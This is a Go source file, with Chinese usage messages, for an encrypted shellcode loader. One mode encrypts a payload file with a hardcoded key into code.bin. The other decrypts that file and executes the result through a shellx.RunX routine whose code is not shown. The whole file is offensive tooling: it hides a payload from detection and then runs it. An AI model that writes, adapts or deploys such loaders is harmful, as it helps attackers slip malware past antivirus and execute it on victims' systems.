package main

import (
    "fmt"
    "os"
    "main/cryptx"
    "main/shellx"
)

const (
    K = "dingzhen88888888"
    O = "code.bin"
    P = 32
)

func main() {
    if len(os.Args) < 3 {
        fmt.Println("用法:")
        fmt.Println("  加密: loader encode payload.bin")
        fmt.Println("  解密并运行: loader run code.bin")
        return
    }
    key := []byte(K)
    mode := os.Args[1]
    switch mode {
    case "encode":
        in := os.Args[2]
        if err := cryptx.EncodeFile(in, O, key); err != nil {
            fmt.Println("加密失败:", err)
            return
        }
        fmt.Println("加密成功，输出文件:", O)
    case "run":
        in := os.Args[2]
        sc, err := cryptx.DecodeFile(in, key)
        if err != nil {
            fmt.Println("解密失败:", err)
            return
        }
        fmt.Printf("解密后 code 长度: %d\n", len(sc))
        l := P
        if len(sc) < l {
            l = len(sc)
        }
        fmt.Printf("code 前%d字节: % x\n", l, sc[:l])
        if len(sc) > 0 {
            shellx.RunX(sc)
        } else {
            fmt.Println("解密结果为空，不执行 code")
        }
    default:
        fmt.Println("未知模式:", mode)
    }
}
